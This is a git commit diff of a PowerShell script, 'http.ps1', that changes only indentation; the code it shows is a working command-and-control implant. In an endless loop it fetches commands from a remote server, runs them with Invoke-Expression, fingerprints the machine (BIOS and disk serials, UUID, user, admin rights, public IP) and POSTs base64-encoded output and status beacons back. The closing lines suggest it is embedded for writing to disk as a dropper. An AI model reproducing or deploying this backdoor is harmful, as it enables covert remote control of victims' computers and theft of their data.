a43a3574b16edf312500398835fd3e6d09a72d55
xze3n <xze3n.py@gmail.com>
2022-04-06 18:53:04 +0300

    Update http.ps1

--- http.ps1
+++ http.ps1
@@ -15,15 +15,15 @@ $exec = 0
 ###### BASE 64 Functions ######
 # Using UTF-8
 function DecodeBase64($String) {
-	$EncodedText = “$String”
-	$DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText))
-	return $DecodedText
+    $EncodedText = “$String”
+    $DecodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedText))
+    return $DecodedText
 }
 function EncodeBase64($String) {
-	$Text = "$String"
-	$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
-	$EncodedText =[Convert]::ToBase64String($Bytes)
-	return $EncodedText
+    $Text = "$String"
+    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
+    $EncodedText =[Convert]::ToBase64String($Bytes)
+    return $EncodedText
 }
 ### HTTP(S) Status Function ###
 function GetUrlStatusCode([string] $Url) {
@@ -34,63 +34,63 @@ function GetUrlStatusCode([string] $Url) {
 }
 
 while($true) {
-	if(GetUrlStatusCode $url) { # Run The Script Only If The Server Is Online
-		###### start-sleep -seconds 0 ###### Change Me To 30
-		$filecontent =(New-Object Net.WebClient).DownloadString($verurl)
-		$filecontent = $filecontent.TrimEnd()
+    if(GetUrlStatusCode $url) { # Run The Script Only If The Server Is Online
+        ###### start-sleep -seconds 0 ###### Change Me To 30
+        $filecontent =(New-Object Net.WebClient).DownloadString($verurl)
+        $filecontent = $filecontent.TrimEnd()
 
-		$a = Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios = $a.split(' ')[2].Trim(); #bios id
-		$b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
-		$c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
-		$ids = $id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
-		$time=([System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), 'GTB Standard Time')).ToString('yyyyMMddHHmmss');
-		$user = $env:USERNAME + "(" + $env:COMPUTERNAME + ")"
-		$ip = (Invoke-WebRequest ifconfig.me/ip).Content
+        $a = Get-WmiObject win32_bios | Format-List SerialNumber | out-string; $id_bios = $a.split(' ')[2].Trim(); #bios id
+        $b=wmic diskdrive get serialnumber; $id_hdd=$b.split('\n')[2].Trim(); #hdd id
+        $c=Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -Property UUID | out-string;$id_uuid=$c.split(' ')[64].Trim() #uuid
+        $ids = $id_bios, $id_hdd, $id_uuid; $ids=[system.String]::Join("_", $ids);
+        $time=([System.TimeZoneInfo]::ConvertTimeBySystemTimeZoneId((Get-Date), 'GTB Standard Time')).ToString('yyyyMMddHHmmss');
+        $user = $env:USERNAME + "(" + $env:COMPUTERNAME + ")"
+        $ip = (Invoke-WebRequest ifconfig.me/ip).Content
 
-		if($filecontent -ne 'standby') {
-			if($filecontent -eq $stop) {break}
-			else {
-				if($filecontent -ne $exec) {
-					# Execute command from server and store the Output
-					Invoke-Expression -Command $filecontent | Out-String -OutVariable Output
-					Write-Host 'Command Executed!' -ForegroundColor green
+        if($filecontent -ne 'standby') {
+            if($filecontent -eq $stop) {break}
+            else {
+                if($filecontent -ne $exec) {
+                    # Execute command from server and store the Output
+                    Invoke-Expression -Command $filecontent | Out-String -OutVariable Output
+                    Write-Host 'Command Executed!' -ForegroundColor green
 					
-					if($Output) {
-						### Build and send Output back to server ###
-						# Encode the Output to BASE64
-						$Text = "$Output"
-						$EncodedText = EncodeBase64($Text)
+                    if($Output) {
+                        ### Build and send Output back to server ###
+                        # Encode the Output to BASE64
+                        $Text = "$Output"
+                        $EncodedText = EncodeBase64($Text)
 
-						# Build the Response
-						$Response = "[RESPONSE] $ip $user $time $EncodedText"
+                        # Build the Response
+                        $Response = "[RESPONSE] $ip $user $time $EncodedText"
 
-						# Send the Output and log the STATUS CODE from the server's RESPONSE
-						$Status = (Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "$Response").StatusCode #| Out-Null
-						if($Status -lt 300) {Write-Host "[SERVER STATUS] $Status" -ForegroundColor green}
-						else {Write-Host "[SERVER STATUS] $Status" -ForegroundColor red}
-					}
+                        # Send the Output and log the STATUS CODE from the server's RESPONSE
+                        $Status = (Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "$Response").StatusCode #| Out-Null
+			if($Status -lt 300) {Write-Host "[SERVER STATUS] $Status" -ForegroundColor green}
+                        else {Write-Host "[SERVER STATUS] $Status" -ForegroundColor red}
+                    }
 
-					$exec = $filecontent
-				}
-			}
-		}
+                    $exec = $filecontent
+                }
+            }
+        }
 
-		$elevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-		###### Uncomment this line ###### $localip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}).IPv4Address.IPAddress
-		Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "[STATUS] $ids $ip $user $elevated $localip $time" | Out-Null
+        $elevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+        ###### Uncomment this line ###### $localip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}).IPv4Address.IPAddress
+        Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "[STATUS] $ids $ip $user $elevated $localip $time" | Out-Null
 
-		if($exec -eq $filecontent) {
-			Write-Host "[SCRIPT] " -f blue -nonewline; Write-Host "Command executed! Input another command or set script to standby";
-			Start-Sleep -Seconds 5 # Increment If Needed
-		}
-		else {
-			Write-Host "[SCRIPT] " -f blue -nonewline; Write-Host "Standing By";
-			Start-Sleep -Seconds 5 # Increment If Needed
-		}
-	} else { # If The Server Is Offline
-		Write-Host "[SERVER STATUS] OFFLINE" -ForegroundColor red
-		Start-Sleep -Seconds 60
-	}
+        if($exec -eq $filecontent) {
+            Write-Host "[SCRIPT] " -f blue -nonewline; Write-Host "Command executed! Input another command or set script to standby";
+            Start-Sleep -Seconds 5 # Increment If Needed
+        }
+        else {
+            Write-Host "[SCRIPT] " -f blue -nonewline; Write-Host "Standing By";
+            Start-Sleep -Seconds 5 # Increment If Needed
+        }
+    } else { # If The Server Is Offline
+        Write-Host "[SERVER STATUS] OFFLINE" -ForegroundColor red
+        Start-Sleep -Seconds 60
+    }
 }
 '@;
 # Set The Contents Of The Main File
